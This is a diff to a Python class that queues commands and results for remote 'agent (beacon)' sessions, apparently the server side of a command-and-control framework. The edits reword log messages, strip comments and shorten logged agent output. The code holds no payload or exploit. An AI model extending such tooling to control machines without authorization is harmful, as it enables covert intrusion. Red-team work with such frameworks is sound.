@@ -2,7 +2,7 @@
 # Manages agent (beacon) sessions and their communication.
 
 import threading
-from collections import deque  # Ajouté
+from collections import deque 
 
 class AgentHandler:
     def __init__(self):
@@ -19,13 +19,13 @@ class AgentHandler:
                 self.agent_commands[agent_id] = deque()  # init queue commande
             if agent_id not in self.agent_results:
                 self.agent_results[agent_id] = deque()   # init queue résultats
-        print(f"[*] Registered new agent: {agent_id}")
+        print(f"[*] New agent registered : {agent_id}")
 
     def update_agent(self, agent_id, fields):
         with self.lock:
             if agent_id in self.agents:
                 self.agents[agent_id].update(fields)
-                print(f"[*] Updated agent: {agent_id}")
+                print(f"[*] Beacon update received for {agent_id}")
     
     def get_agent(self, agent_id):
         with self.lock:
@@ -52,26 +52,20 @@ class AgentHandler:
             if agent_id in self.agent_commands:
                 while self.agent_commands[agent_id]:
                     cmds.append(self.agent_commands[agent_id].popleft())
-            if cmds:
-                print(f"[*] {len(cmds)} commandes récupérées et retirées pour agent {agent_id}")
             return cmds
 
-    # --- Gestion des résultats par agent ---
     def push_agent_result(self, agent_id, output):
         with self.lock:
             if agent_id not in self.agent_results:
                 self.agent_results[agent_id] = deque()
             self.agent_results[agent_id].append(output)
-            print(f"[*] Stocked result for agent {agent_id}: {output[:100]}")
+            print(f"[*] Stocked result for agent {agent_id}: {output[:10]}")
 
     def pop_agent_results(self, agent_id):
-        # Consomme/détruit les résultats en les retournant (lecture destructrice)
         with self.lock:
             if agent_id in self.agent_results:
                 results = list(self.agent_results[agent_id])  # récupère tout
                 self.agent_results[agent_id].clear()          # efface la queue
-                if results:
-                    print(f"[*] {len(results)} résultat(s) consommé(s) pour agent {agent_id}")
                 return results
             return []
 
